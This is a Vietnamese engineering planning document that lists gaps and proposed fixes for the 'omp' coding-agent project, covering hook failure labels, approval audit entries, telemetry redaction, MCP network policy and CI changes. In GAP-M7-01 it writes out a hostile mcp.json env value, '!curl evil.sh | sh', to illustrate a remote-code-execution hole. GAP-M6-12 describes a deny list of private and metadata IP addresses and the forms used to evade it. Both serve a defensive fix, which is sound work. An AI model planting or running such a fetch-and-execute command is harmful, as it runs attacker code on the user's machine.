**Pháp lý:** chép được về mặt pháp lý nhưng **không nên chép** — lấy ý tưởng. `dsh` LICENSE:1-3 là MIT. Nhưng `vendor/` của dsh là Cordis rc.7 + 22 bản vá của riêng DeepSeek, và `vendor/README.md` (19 KB) **không thuộc artifact nào được publish** — tức sửa đổi của họ không được ghi ở đâu trong LICENSE. Đây đúng là lý do M4 đã dựng ra: *chép file của DeepSeek = chép bản vá của họ*. Đề xuất này chỉ mượn **một câu hỏi**, trả lời bằng nội dung của chính diff omp. **Không file nào từ dsh được đưa vào.**

**Cái được bảo toàn.** **Không đụng `package.json`, không đổi byte nào của patch.** Test phải so trên byte thật của file patch, không phải trên trường `purpose` do script tự điền — nếu không thì ba tập luôn khớp và test đó vô nghĩa.

**Đã phủ chưa:** không. `grep 'patch ledger'` trong M1/M2/M3/M5/M6/M7 → 0 hit.

---

## GAP-M4-11 — Một hàm chuẩn hoá lỗi không ném được, thay cho 895 bản sao của cùng một idiom

**Nguồn:** `dsh.106`
**Milestone:** M4 Wave B — cùng đợt M4-4/M4-6
**Effort:** M về cơ hế, **đắt về kỷ luật ghi chú**

**Cái omp thiếu — đã kiểm, con số khớp tuyệt đối.** `git grep -h "instanceof Error ? .*\.message : String(" -- packages/ | wc -l` → **895**, rải đều từ `packages/agent/src/agent-loop.ts` (3 hit) tới `packages/ai/src/auth-broker/server.ts` (8). Không có hàm dùng chung nào: `export function errorMessage|normalizeError|toErrorMessage` trong `packages/utils/src` và `packages/coding-agent/src` chỉ trả về **hai** bản *private trong file* — `dap/client.ts:49` và `dap/session.ts:118`.

**Hệ quả cụ thể:** `String(obj)` và `obj.message` đều gọi user code. Một Proxy — hoặc đơn giản hơn, một object có getter `message` ném — làm **chính biểu thức chuẩn hoá ném**. Tức là phép chuẩn hoá chạy bên trong một `catch` và nuốt mất lỗi gốc, thay bằng một lỗi mới không liên quan. Ở 895 call site thì đây không phải lý thuyết.

**Hình dạng port.** Một hàm, **không phải một refactor 895 chỗ**. Bốn việc:
1. `normalizeErrorMessage(value: unknown): string` trong `packages/utils` — bọc **mọi** truy cập thuộc tính trong try/catch riêng, không dùng `String(value)` trực tiếp lên object tuỳ ý, fallback `Object.prototype.toString.call(value)` (không ném được với Symbol / null / Proxy đã huỷ), và **không bao giờ** ném.
2. **Di dời có chọn lọc**: các đường mà bẫy là thật — agent loop, session, TUI error render, logger — chứ không phải cả 895. Ghi rõ vào item rằng phần còn lại là **nợ kỹ thuật có chủ**.
3. Một **oxlint rule** cấm idiom thô trong code mới. AGENTS.md cho phép dùng oxlint để giữ bất biến cấu trúc và **cấm** source-grep trong test, nên đây là đường đúng, không phải đường lách.
4. Test: ném object có getter `message` ném lỗi, khẳng định `normalizeErrorMessage` trả về chuỗi và **không** ném; khẳng định **âm** rằng lỗi gốc vẫn là lỗi được báo, không phải lỗi của getter.

**Pháp lý:** chỉ mang ý tưởng. Lập luận "normalization phải là lớp ngoài cùng và phải tổng" là của dsh (MIT); mã viết mới. Không chép dòng nào.

**Cái được bảo toàn.** Hai bản `private` ở `dap/client.ts:49` và `dap/session.ts:118` **giữ nguyên hành vi** — có thể gọi hàm mới, nhưng không được xoá. Và 895 chỗ **không được sửa hết** trong PR này; PR phải nêu rõ tiêu chí chọn đã dùng để chọn 4 đường đó.

**Cần người quyết →** xem GAP-D8 ở §4.

---

## GAP-M4-12 — Một hook nổi không được rửa thành quyết định chặn

**Nguồn:** `dsh.100`
**Milestone:** M4 Wave C — cùng đợt M4-7
**Effort:** S–M

**Ba đường, ba hành vi, chỉ một đúng.**
1. `extensions/runner.ts:1615` `emitToolCall` chạy handler qua `#runHandlerWithTimeout`; khi handler lỗi/hết giờ thì `onFailure` trả `{ block: true, reason: "Extension <path> failed: <msg>" }`. `extensions/wrapper.ts:262` đổi `callResult.block` thành `throw new Error(reason)`. **Model nhận đúng chuỗi đó như một tool error** — tức một crash của bên thứ ba được trình bày cho model như một quyết định từ chối mà không ai từ chối.
2. `hooks/runner.ts:327` `emitToolCall` (đường `hooks.json`) tệ hơn: không try/catch, không timeout, và comment tự thừa nhận *"Errors are thrown (not swallowed) so caller can block on failure"*; `hooks/tool-wrapper.ts:77-80` ném tiếp `Hook failed, blocking execution`.
3. `hooks/runner.ts` hàm `emit()` — **đường chung — đã làm đúng**: bọc từng handler trong try/catch và gọi `this.emitError({ hookPath, event, error })`.

Vậy omp đã có đúng hình dạng ở 1 trong 3 chỗ, và **không nơi nào phân biệt "bị chặn" với "hỏng"**.

**Hình dạng port.** Không đổi quyết định fail-closed — fail-closed là đúng và phải giữ. Chỉ sửa **nhãn**. Năm việc:
1. `ToolCallEventResult` mang thêm phân loại: `{ block: true; reason; kind: "denied" | "hook-failed" }`; `wrapper.ts:262` và `hooks/tool-wrapper.ts` truyền ký hiệu này xuống lỗi tool.
2. Renderer hiện tại (`ToolExecutionComponent` + `tool-execution.ts`) hiển thị **hai nhãn khác nhau** — đây là hợp đồng quan sát được, và là nơi G3/G4 của M4-7 đã dựng sẵn seam để test.
3. Gọi `emitError` trên đường `tool_call` để khớp với `emit()` — sửa dấu vết quyền lợi.
4. Thêm timeout cho `hooks/runner.ts:327` theo cùng hạn mức `extensionHandlerTimeoutMs` đã dùng.
5. **Khẳng định âm bắt buộc:** một handler trả `{ block: true }` **thật** vẫn phải ra nhãn `denied`. Không có nó thì "sửa" này chỉ là đổi chữ toàn bộ.

**Pháp lý:** chỉ mang ý tưởng. Quy tắc "hook hỏng ≠ hook từ chối" là của dsh (MIT); mã viết mới. Không chép dòng nào.

**Cái được bảo toàn.** **Fail-closed phải giữ nguyên** ở cả ba đường — hôm nay hook hỏng thì tool không chạy, và sau item này nó vẫn không chạy. Chỉ *từ khóa* trong thông báo đổi. Mọi test hiện có khẳng định "hook lỗi ⇒ tool bị chặn" phải **giữ xanh**, không được sửa cho xanh.

**Phụ thuộc.** Chạm `extensibility/extensions/` và `extensibility/hooks/` — cùng vùng với **M2 WI-9** (sổ sở hữu per-extension). Không chặn, nhưng **phải ghi thứ tự merge với WI-9** vào item, vì WI-9 sửa đúng đường đăng ký handler mà item này sửa đường gọi. Rủi ro lớn nhất không phải code mà là **đường nối**: `agent-session.ts:4509` gọi `emitToolCall` không bọc try/catch, nên phải soát cả nó, không chỉ hai wrapper.

**Đã phủ chưa:** không. Không work item nào trong bảy kế hoạch nói về chứa lỗi hook.

---

## GAP-M4-13 — Cặp audit bền vững cho mỗi lần hỏi quyền: sau một crash, trả lời được "ai đã duyệt cái này"

**Nguồn:** `dsh.85`
**Milestone:** M4 Wave B — cùng đợt M4-4
**Effort:** M

**Đây là đúng lỗi của M4-4 đặt ở chỗ rủi ro cao nhất.** M4-4 nói: `/settings` ghi xong rồi báo *applied* mà không biết có lên đĩa không. Ở đây: một bash chạy rồi transcript không lưu rằng **con người** đã duyệt nó, chỉ lưu kết quả. Cùng lỗi hình dạng, hậu quả nặng hơn.

**Cái omp thiếu — đã kiểm.** Union `SessionEntry` (`session/session-entries.ts:300-315`) có **16** thành viên và **không có thành viên nào là approval** (`grep -c "Approval"` → 0). `tool_approval_requested` / `tool_approval_resolved` (`extensibility/extensions/types.ts:985`, phát tại `wrapper.ts:328`) là **event trong RAM**; `modes/warp-events.ts:197-203` chỉ chuyển tiếp cho một bản ghi sự kiện ngoài. Sau một crash, transcript cho thấy một `tool_use` không có `tool_result` — nhưng **không** phân biệt được "người đã bấm duyệt rồi máy chết" với "cổng quyền chưa từng chạy".

**Hình dạng port.** Một entry, không phải một hệ thống. Bốn việc:
1. `ApprovalEntry { toolCallId, toolName, resolvedPolicy, decision, decidedAt, gate: "tui" | "acp" | "xdev" | "policy" }` ghi **đúng một lần** khi hỏi và **đúng một lần** khi trả lời, bọc quanh turn như `wrapper.ts:328`/`:340` đã làm cho event.
2. **Ràng buộc quan trọng nhất:** entry này **có trong log nhưng không được đi vào context của model** — nó là bản ghi kiểm toán, không phải message. Cơ chế sẵn có để làm việc đó là `EPHEMERAL_MODEL_CHANGE_ROLE` (`session/turn-recovery.ts:72`), tức đã có tiền lệ "trong log, không trong model". **Không thêm đường lọc thứ hai.**
3. Đọc lại được qua một lệnh chỉ-đọc — cùng họ với `omp extensions-triage` của M4-9.
4. **Phụ thuộc bắt buộc:** `resolveApproval` (`wrapper.ts:290`) là nơi duy nhất quyết định chính sách, nên bản ghi phải lấy từ **đó**, không ghi lại ở call site — nếu không thì chính ta dựng nguồn sự thật thứ hai, đúng thứ M4 cấm.

**Pháp lý:** chỉ mang ý tưởng. Cặp event bền vững là thiết kế của dsh (MIT); entry và tên field viết mới. Không chép dòng nào.

**Cái được bảo toàn.** `SessionEntry` union phải giữ **tương thích ngược**: transcript cũ không có entry approval vẫn phải đọc được. Và cơ chế `EPHEMERAL_MODEL_CHANGE_ROLE` phải được **tái dùng**, không nhân bản — nhân bản là cách tạo nguồn sự thật thứ hai mà chính M4 cấm.

**Phụ thuộc:** M4-4 (tiền lệ `ChangeResult` là chung). PR **riêng** nhưng **cùng quyết định release**; và phải nói rõ thứ tự merge với M4-9 nếu lệnh đọc dùng chung hạ tầng.

**Đã phủ chưa:** không. `grep "approval audit"` và `audit trail` trên cả bảy kế hoạch → 0 hit.

**Cần người quyết →** xem GAP-D2 ở §4.

---

# M6 — Bài học từ codex, opencode, gajae-code

M6 hiện là audit-only (`grep -cE '^## W[0-9]'` → 0). Chín mục dưới đây là **hàng mới** cho bảng `## BẢNG: THỨ omp CHƯA CÓ` của M6, đánh số **8 → 16** (bảng hiện có 7 hàng).

> Một hàng của bảng M6 cũng phải bỏ đi: hàng "doctor taxonomy + repair journal" mà đề xuất gốc dành cho M6 **đã được gộp vào GAP-M1-18**. Đó là lý do bảng đi từ 8 đến 16 chứ không phải 8 đến 17.

Về pháp lý, cả chín mục đều dưới cùng một phán quyết đã có sẵn trong M6: gajae là **MIT thuần, ngoài đường PDF/MuPDF** (AGPL — ranh giới đỏ). Chép được kèm nghĩa vụ giữ copyright + permission notice. Vì gajae là fork-đổi-tên của chính omp (`NOTICE.md:5`), phần kế thừa trực tiếp có copyright của **cả hai phía**. Mục nào bên dưới ghi "chỉ mang ý tưởng" thì không chép dòng nào.

| Mục | Nguồn | blocks |
| --- | --- | --- |
| GAP-M6-08 | `gajae.52` | — |
| GAP-M6-09 | `gajae.69` + `gajae.109` | — |
| GAP-M6-10 | `gajae.21` + `.74` + `.100` + `.105` | — |
| GAP-M6-11 | `gajae.97` + `gajae.104` | sau M3 Sóng 4 + M7 Sóng 0b |
| GAP-M6-12 | `gajae.24` + `gajae.81` | — |
| GAP-M6-13 | `gajae.6` | sau M5 W10 |
| GAP-M6-14 | `gajae.16` | sau M5 W10 |
| GAP-M6-15 | `gajae.29` | — |
| GAP-M6-16 | `gajae.42` | sau quyết định M6 hàng 1 + hàng 7 |

---

## GAP-M6-08 — Sáu sàn compaction khẩn cấp không tắt được

**Nguồn:** `gajae.52` · **Effort:** S — khoảng 50 dòng

**Cái omp thiếu — đã kiểm.** omp CHỈ có ngưỡng theo token: `compaction.ts:191-192` khai `thresholdPercent?` / `thresholdTokens?`, clamp ở `:390-410`, quyết định ở `:365-366`. `grep -iE 'emergency|floorLimit|hardFloor' packages/agent/src/compaction/*.ts` → **0 hit**. Không sàn nào theo RSS / kích thước JSONL / serialized context / image bytes / số message.

**Hình dạng port.** Thêm `EmergencyCompactionLimits` + `resolveEmergencyCompactionLimits(totalMemoryBytes)` + `firstExceededEmergencyLimit()` vào `compaction.ts`; nối vào nhánh quyết định compact ở `:365-366` sao cho token chưa vượt ngưỡng nhưng một sàn khác đã vượt thì **vẫn compact**, đi qua cùng đường cắt pair-safe. `resolveEmergencyCompactionLimits` phải clamp `os.totalmem()` rỗng/sai để sàn heap **không bao giờ** bị tắt.

**Cái được bảo toàn.** **Không thêm setting tắt** — đó là toàn bộ ý nghĩa của từ *non-disableable*, và là thứ phải nói trước khi code vì người đọc sẽ tìm đường tắt. Đường cắt pair-safe hiện tại phải giữ nguyên: một compaction cưỡng ép không được để lại `tool_use` không có `tool_result`. M2 WI-9 (sổ sở hữu per-extension) có thể chạm cùng vùng → ghi thứ tự merge.

---

## GAP-M6-09 — Cổng fan-out: receipt có cấu trúc bắt buộc trên ngưỡng cứng

**Nguồn:** `gajae.69` + `gajae.109` (**hai mục trùng nhau, đã gộp**) · **Effort:** S — 95 dòng, thuần predicate, không I/O, không state

**Cái omp thiếu.** `task/spawn-policy.ts` chỉ là allowlist **tên** agent (`resolveSpawnPolicy` trả `{enabled, defaultAgent, allowedAgents, …}`) — hoàn toàn khác loại: cho phép spawn agent nào, không phải chặn fan-out. `grep -rn 'justification' packages/coding-agent/src/` chỉ trong autoresearch, không liên quan. Không có ngưỡng số lượng child.

**Hình dạng port.** File mới `packages/coding-agent/src/task/spawn-gate.ts`: `DEFAULT_SPAWN_THRESHOLD`, `SpawnPlanReceipt`, `findMissingPlanFields()`, `evaluateSpawnGate()`. Nối vào nơi quyết định fan-out trong `task/executor.ts`, trả `ToolError` **nêu đúng tên field thiếu**.

**Cái được bảo toàn.** `spawn-policy.ts` **không được sửa** — nó là chính sách khác, đang đúng, và người đọc sẽ tưởng bị thay thế. `parallel.ts` / `workpool.ts` giữ nguyên: chúng giới hạn **số chạy song song**, cổng này chặn **trước khi lập kế hoạch**. Hai lớp, không phải một.

---

## GAP-M6-10 — Serializer có ngân sách + allowlist telemetry fail-closed

**Nguồn:** `gajae.21` + `.74` + `.100` + `.105` (**bốn mục, một lớp vấn đề**) · **Effort:** M

**Cái omp thiếu — đã kiểm, đường dẫn cần sửa.** `failChatSpan` nằm ở **`packages/agent/src/telemetry.ts`**, không phải `packages/coding-agent/src/telemetry.ts`. `:1205` ghi `span.setStatus({code: SpanStatusCode.ERROR, message: err.message})` và `:1208` ghi `String(err)` cho lỗi không phải Error — **khẳng định của đề xuất đúng tuyệt đối**, chỉ thiếu đường dẫn. `cfgTelemetryOtlpExportEnabled` default `true`. Không có allowlist khoá, không có forbidden-key fail-closed.

omp CÓ redaction rất mạnh (`secrets/placeholder-scan.ts`, `memory-backend/redact.ts`, `mcp/json-rpc.ts` `redactUrlForLog`) — nhưng redaction đó **theo-chỗ gọi**, không có một serializer có **ngân sách** áp cho payload điều khiển.

**Hình dạng port.** Một helper `bounded-serialize(value, {maxDepth, maxBytes, allowlist})` dùng chung, thay vì redaction rải rác. Áp vào `failChatSpan` (bỏ message thô, chỉ giữ `errorType` + message đã cắt và sanitize), vào `collector.failChat`, và làm **khoá export** khi phát hiện khoá. **Không** thêm DSN, **không** thêm crash relay.

**Pháp lý:** chép được kèm nghĩa vụ giữ notice. Với phần sanitizer mới thì **chỉ mang ý tưởng** — ngân sách depth/byte là thiết kế chung, không bản quyền.

**Cái được bảo toàn.** Ba chỗ redaction sẵn có **giữ nguyên** — helper mới là lớp trên, không phải lớp thay. `span.recordException(err)` giữ nguyên: nó ghi exception theo chuẩn OTel và là đường debug chính.

---

## GAP-M6-11 — Schema-check giá trị trả về của hook + chẩn đoán có cấu trúc

**Nguồn:** `gajae.97` + `gajae.104` (`104` là phần cấu trúc của `97`) · **Effort:** M

**Cái omp thiếu.** `extensions/runner.ts:294` `result = handlerResult as SessionBeforeCompactResult | SessionBeforeTreeResult`, `:303` `as ToolResultEventResult`, `:306` `as SessionCompactingResult` — **type-assertion mù** của giá trị do plugin tuỳ ý trả về, đi thẳng vào host control flow. `grep -rn 'diagnostic' packages/coding-agent/src/extensibility/hooks/*.ts` → 0 hit.

**Hình dạng port.** Thêm `validateHookResult(event, value)` trả `{ok, code, detail}` chạy **trước mỗi chỗ assert** ở `runner.ts:294/303/306`; lỗi thì thành `HookError` có mã, chứ không ném im lặng. Bảng `contract convention × event` (authority / awaitBehavior / errorBehavior / timeoutMs / trustRequirement) là tài liệu, đặt cạnh `docs/hooks.md`.

**Pháp lý:** chép được, giữ copyright + permission notice MIT. Lưu ý attribution hai phía vì gajae là fork của chính omp. Bên tham chiếu có `constrained-hooks.ts` (18 KB) + `validation.ts` (6 KB) — nhưng phần cần lấy chỉ là **lớp validate**, không phải cả constrained API.

**Cái được bảo toàn.** Đây là đường `session-` mà nhiều extension thật của omp đi qua. Validation phải **chấp nhận mọi giá trị mà các extension sẵn có trả về hôm nay** — nếu không, item này là một breaking change trừng phạt người dùng vì siết bảo mật. Bảng contract là **tài liệu**, không được dùng làm nguồn sự thật thứ hai cho runtime.

**Phụ thuộc — cứng.** Sau **M3 Sóng 4** (bề mặt plugin A4/B1/B2/B3) và **M7 Sóng 0b** (SEAM), vì cùng sửa `extensibility/extensions/types.ts` và `hooks/types.ts`. Đây là lý do đưa vào M6 chứ không vào M3: tránh đụng sóng đang chạy.

---

## GAP-M6-12 — Chính sách mạng deny-first cho MCP server

**Nguồn:** `gajae.24` + `gajae.81` (`24` là nửa lõi, `81` là nửa áp dụng lúc cài plugin) · **Effort:** M

**Đây là mục đứng đầu về tỉ lệ rủi ro/công sức trong toàn sổ.**

**Cái omp thiếu — đã kiểm.** omp CÓ header precedence + origin-lock chặn redirect đổi origin (`transports/header-policy.ts:89-120`) — nhưng **KHÔNG** có bảng deny dải địa chỉ. `grep -rniE '169\.254|isPrivate|loopback.*block|privateNetwork|metadata.*ip' packages/ --include='*.ts' | grep -v test` chỉ trả về field `isPrivate?` của GitHub repo và chữ "metadata" trong scraper; **không dòng nào chặn mạng**. Không xử lý IPv4-mapped IPv6, zone-id, trailing-dot.

**Hình dạng port.** File mới `packages/coding-agent/src/mcp/network-policy.ts`: `isDeniedIpv4` / `isDeniedIpv6` theo bảng deny loopback, private, link-local, multicast, unspecified + `169.254.169.254`; `assertUrlAllowed()`; `assertHeadersAllowed()`. Gọi từ `manager.ts` lúc nối, và từ discovery lúc nạp khai báo MCP của plugin. **Tái dùng origin-lock sẵn có, không viết lại.**

**Pháp lý:** chép được, giữ copyright + permission notice MIT. Bảng deny là **dữ liệu chuẩn công khai**, không thuộc bản quyền ai.

**Cái được bảo toàn.** Origin-lock ở `header-policy.ts:89-120` phải giữ nguyên và là lớp **trên**; `network-policy.ts` là lớp dưới. Bảng deny phải xử lý đủ bốn dạng né tránh nêu trên — bảng thiếu `::ffff:127.0.0.1` là bảng không có tác dụng.

**Cần người quyết →** xem GAP-D1 ở §4. **Đây là quyết định chặn, không phải ghi chú.**

---

## GAP-M6-13 — Sổ ngưỡng hiệu năng có phân loại bằng chứng

**Nguồn:** `gajae.6` · **Effort:** S cho phần lõi (97 dòng bên tham chiếu); tự chọn ngưỡng thì tốn công nhưng không chặn

**Cái omp thiếu — đã kiểm.** omp CÓ 14 file `.bench.ts` trong `packages/coding-agent/bench/` + 3 trong `packages/natives/bench/`, và một hàm `bench()` cục bộ chỉ in số. `grep -rn 'threshold' packages/coding-agent/bench/*.ts` → **0 hit**. `grep -n -i 'bench|perf' .github/workflows/ci.yml` → **0 hit**: **CI không đo gì cả.**

**Hình dạng port.** File mới `packages/coding-agent/bench/perf-threshold.ledger.ts` với `EvidenceClass` + `PerfThresholdEvidence`; script sinh báo cáo; job CI **advisory trước**. Ngưỡng wall-clock và RSS bắt đầu ở mức advisory, chỉ lên thành cổng cứng khi có before/after sạch + phê duyệt người. **KHÔNG** chép `perf-corpus-schema.ts` (1.146 dòng) — đó là corpus RLM, ngoài phạm vi.

**Cái được bảo toàn.** 17 file `.bench.ts` hiện có phải chạy được như cũ. Cổng CI phải cho phép **merge** khi chưa đủ bằng chứng — cổng đỏ sớm hơn bằng chứng là cách để có một sổ ngưỡng không ai cập nhật.

**Phụ thuộc:** sau **M5 W10** (CI / release) — cùng sửa `.github/workflows/ci.yml`.

---

## GAP-M6-14 — Chọn task CI theo diff, giữ cổng fail-closed

**Nguồn:** `gajae.16` · **Effort:** M

**Cái omp thiếu — đây là mục mà omp đã làm đúng phần lớn.** omp ĐÃ CÓ sharding (`ci.yml:582` `OMP_TEST_SHARD` 1/3,2/3,3/3) và ĐÃ CÓ cổng fail-closed (`ci-test-ts.ts:933-937`, `selected.length === 0` thì throw) — đúng bài học trọng tâm. Thiếu đúng một thứ, đã kiểm: `grep -nE 'affected' .github/workflows/*.yml scripts/ci-test-ts.ts` → **0 hit**. Không chọn theo diff.

**Hình dạng port.** Bộ chọn task theo diff trong `ci-test-ts.ts`, **nối vào** sharding sẵn có — không thay thế nó. Giữ nguyên cổng fail-closed; thêm cổng thứ hai: selector rỗng vì diff không chạm gì thì chạy tập smoke tối thiểu thay vì báo xanh.

**Pháp lý:** chỉ mang ý tưởng, không chép dòng nào. Thuần thiết kế selector.

**Cái được bảo toàn.** Sharding và cổng fail-closed hiện có **giữ nguyên** — không viết lại. Đây là mục duy nhất trong sổ nói rõ *đừng* sửa thứ đã đúng.

**Phụ thuộc:** sau **M5 W10** — cùng sửa `ci.yml`, và xếp sau GAP-M6-13 để không sửa hai lần.

---

## GAP-M6-15 — Ghim nguồn marketplace: từ chối khôi phục khi không có SHA

**Nguồn:** `gajae.29` · **Effort:** S — hai hàm thuần + một chỗ nối

**Cái omp thiếu — đây là mục mà omp đã làm đúng phần lớn.** omp ĐÃ CÓ provenance: `source-resolver.ts:137/150/165` truyền sha xuyên suốt, `manager.ts:570-571` hiển thị `sha.slice(0,7)`, `git-url.ts` có `parseGitUrl` + `isGitSpec`. Thiếu đúng phần gajae chỉ ra: phân loại **immutable CHỈ khi SHA 40-hex**, và từ chối khôi phục khi nguồn không được ghim. `grep 'sourcePin|assertPinnedSource'` → không có.

**Hình dạng port.** Hai hàm thuần trong `marketplace/source-resolver.ts`: `sourcePin(source)` phân loại immutable/mutable theo mẫu SHA 40-hex; `assertPinnedSource()` ném khi khôi phục mục không ghim. Nối vào đường restore của `manager.ts`. **Không thay đổi định dạng file đã cài.**

**Cái được bảo toàn.** Truyền SHA và hiển thị provenance hiện có **giữ nguyên, không viết lại**. Định dạng file đã cài **bất biến** — mục đã cài bằng tag/branch vẫn phải cài được, chỉ là không được *khôi phục lại* khi không ghim.

---

## GAP-M6-16 — Giải phẫu khung TUI + hợp đồng đáp ứng, viết ra

**Nguồn:** `gajae.42` · **Effort:** S — tài liệu thuần, **không sửa mã**

**Cái omp thiếu — đây là mục mà code đã có hết, chỉ thiếu văn bản.** Các thành phần ĐỀU tồn tại: `chrome/dynamic-border.ts`, `components/tab-bar.ts`, `components/spacer.ts`, `chrome/format.ts`, và quy tắc chặn 30 của `SettingsList` ĐÃ có tại `settings-list.ts:574` và `:698` (`Math.min(30, …)`). Cái thiếu là phần VĂN BẢN: `grep -rn 'DynamicBorder|TabBar|Spacer' docs/*.md` → **0 hit**. `docs/tui.md` là hợp đồng cho TÍCH HỢP extension, không phải cho tác giả component.

**Hình dạng port.** Tài liệu thuần, ba phần: giải phẫu khung, quy tắc hai cột, và thứ tự ưu tiên cắt bỏ. Đặt cạnh `docs/tui-core-renderer.md`. Nguồn thứ tự ưu tiên cắt bỏ lấy từ `metadata.json` của lưới ảnh chụp đã được duyệt ở hàng 7 của bảng quyết định M6.

**Pháp lý:** chỉ mang ý tưởng. Quy tắc bố cục và văn bản giải phẫu không thuộc bản quyền; **không chép dòng nào** từ `docs/design/` của gajae.

**Cái được bảo toàn.** **Không sửa dòng code nào.** Mục này chỉ ghi ra cái đã đúng. Nếu phát hiện ra khung thật khác tài liệu thì sửa tài liệu, không sửa khung.

**Phụ thuộc — cứng:** sau **hai quyết định đã có trong chính M6** — hàng 1 (chọn phương án (iii) tiếp tục compose string row) và hàng 7 (duyệt lưới ảnh chụp đa-viewport). Làm trước thì tài liệu mô tả một thế giới không tồn tại.

---

# M7 — Cái riêng của senpi

Ba mục này là **sóng 0c** của M7, sau Sóng 0a (W0 — pháp lý). W0 là điều kiện tiên quyết cứng cho cả ba: dòng nào được chép thì phải ghi NOTICE.

> **Một dòng trong M7 phải sửa.** Sóng 0b (SEAMFREE) hiện ghi rõ **không lấy** mcp: *"Không lấy mcp, compaction, webfetch, ask-user, todotools — omp đã mạnh hơn"* (`MILESTONE_7_EXECUTION_PLAN.md:91`). Cả ba mục dưới đây **mâu thuẫn** dòng đó. Nhưng đó là một nhận định về **bề mặt tool** của MCP, không phải về **đường cấu hình** của MCP — và GAP-M7-01 là một RCE đang sống. Dòng "không lấy" cần được sửa thành "không lấy phần tool surface; phần config-value execution thì lấy vì có lỗ hổng".

---

## GAP-M7-01 — Đóng lỗ hổng RCE: `env` của project-scope `mcp.json` không được chạm `/bin/sh`

**Nguồn:** `senpi.65` · **Ưu tiên cao nhất trong sóng 0c** — khác hai mục kia, đây là **lỗ hổng đang sống**, không phải điều chỉnh
**Effort:** M–L (1–1,5 ngày)

**Đây là khoảng trống nặng nhất tìm được trong đợt này.** Đã kiểm, từng mắt xích:
- `config/resolve-config-value.ts:22-24` — `isCommandConfigValue` trả `true` cho **bất kỳ** giá trị bắt đầu bằng `!`.
- `:104-108` — `resolveConfigValue` điều phối giá trị đó tới `executeCommand`.
- `:132` — chạy nó qua `ptree.exec(["/bin/sh", "-c", command], …)` **trong thư mục project**.
- `mcp/manager.ts:1892-1906` — gọi `resolveConfigValue` trên **mọi** env entry của **mọi** stdio MCP server không có `envPolicy: "literal"`.
- `mcp/config.ts:104` — `const enableProjectConfig = options?.enableProjectConfig ?? true` — **mặc định là TRUE**, và call site duy nhất ghi đè là `read-cli.ts:90` đọc một user setting.

**Hệ quả:** clone một repo thù địch chứa `.omp/mcp.json` với `"env": {"X": "!curl evil.sh | sh"}`, rồi chạy omp trong đó → lệnh đó chạy.

**Một nửa không phải lỗ hổng — và phải nói rõ.** Nửa `$(` của senpi **không** là gap thật của omp: `resolve-config-value.ts:106` dùng `$envExact`, một tra cứu tên chính xác, không phải khai triển template, nên `$(...)` đi qua **inert**. Chỉ nửa `!` là toàn bộ phát hiện. Ghi sai chỗ này sẽ dẫn tới một PR sửa một thứ vốn đã an toàn và bỏ sót thứ thật sự nguy hiểm.

**Hình dạng port — lấy RULE của senpi, không lấy CÔNG CỤ.** Không port blanket throw của senpi: `!command` của omp là **tính năng mang tải trọng thật** — nó đứng sau `authStorage.keys.setResolver(resolveConfigValue)` tại `config/model-registry.ts:436` và được tài liệu hoá ở `packages/ai/src/auth/types.ts:337`. Port thẳng sẽ phá một tính năng đang chạy.

Đúng là: để độ phân giải có khả năng exec phụ thuộc vào **mức tin cậy của config** — `!command` chỉ resolve cho **user-scope** `mcp.json`, và bị từ chối (hoặc hạ xuống literal) cho **project-scope** trừ khi project trust được cấp. Sẵn có `envPolicy: "literal"` (`manager.ts:1892`) là **carrier đúng**; việc sửa là làm project-scope server **mặc định** là nó.

**Pháp lý:** chép được, nhưng **KHÔNG nên chép nguyên văn** — đây là mục ta lấy RULE chứ không lấy CODE. Hai-token check của senpi là MIT nên chép thì hợp pháp; chỉ là sai hình dạng cho omp. Nghĩa vụ: giữ MIT notice + `NOTICE.md` attribution + **không** lấy trademark senpi. W0 chi phối.

**Cái được bảo toàn.** **Đường user-scope phải giữ nguyên 100% hành vi** — kể cả `authStorage` key resolver. Đó là lý do effort là M–L chứ không phải S: blast radius là đường đó. Test phải **giữ xanh** cho user-scope `!command` và **đỏ** cho project-scope.

**Liên hệ senpi.93.** senpi.93 (project trust gate) trả lời bằng **prompt**, mục này trả lời bằng **mặc định theo scope**. Làm cả hai thì mục này đến trước và biến 93 thành một cải thiện UX, không phải một điều kiện bảo mật.

**Cần người quyết →** xem GAP-D9 ở §4.

---

## GAP-M7-02 — Drop failed assistant turn ngay tại biên compaction, không chỉ ở biên session-restore

**Nguồn:** `senpi.3` · **Effort:** S — khoảng 0,5 ngày. Lý do đã được viết sẵn trong doc comment của senpi, không cần làm thiết kế.

**Cái omp thiếu — đã kiểm, và đây là bằng chứng mạnh.** omp drop turn lỗi/abort ở **đúng một chỗ**: `buildSessionContext()` trong `session-context.ts` (vòng `if (!options?.transcript)` từ `:703`). `grep -n 'stopReason === "error"' -- packages/coding-agent/src/session/*.ts` cho thấy các hit còn lại đều là predicate **theo tính năng** (`isTitleContextReply` `messages.ts:157`, `assistantTurnProducedOutput` `:538`, `isTranscriptUsageAnchor` `transcript-tokens.ts:46`, các guard plan-mode/exit-diagnostics) — **không cái nào xoá message**.

Hai consumer dựng LLM request **không** đi qua `buildSessionContext`:
- **compaction** — `packages/agent/src/compaction/compaction.ts:1416-1426` gọi `findCutPoint(compactionEntries, tokenizer, 0, len, keepRecentTokens)` trên danh sách entry thô; một assistant turn đã fail là một cut point hợp lệ, nên text dở của nó **được tính vào** `keepRecentTokens` và có thể bị giữ lại.
- **default turn converter** — `packages/agent/src/agent.ts:72-77` lọc theo `role` và **không bao giờ** nhìn `stopReason`; `session/messages.ts:1137` `convertToLlm` cũng vậy (đã kiểm: không có `stopReason` trong thân hàm).

Nên tuyên bố của senpi **đúng**: trigger compaction đếm quá các turn fail, và tập đó không còn khớp với tập mà request kế tiếp mang đi.

**Hình dạng port.** Thêm một leaf `dropFailedAssistantTurns<T extends { role: string }>(messages: readonly T[]): T[]` vào `packages/agent/src/compaction/` (đặt đúng chỗ senpi đặt, `packages/ai/src/utils/drop-failed-assistant-turns.ts`), rồi gọi nó từ entry scan của `findCutPoint` và từ trigger compaction. Helper của senpi được gõ có chủ đích (`{ role: string }` + narrowing runtime) **để truyền được cả `Message[]` lẫn `AgentMessage[]`** — giữ nguyên hình dạng đó.

**KHÔNG** port phần `harness/messages.ts` `convertToLlm` tail của senpi — đường đó đã được phủ.

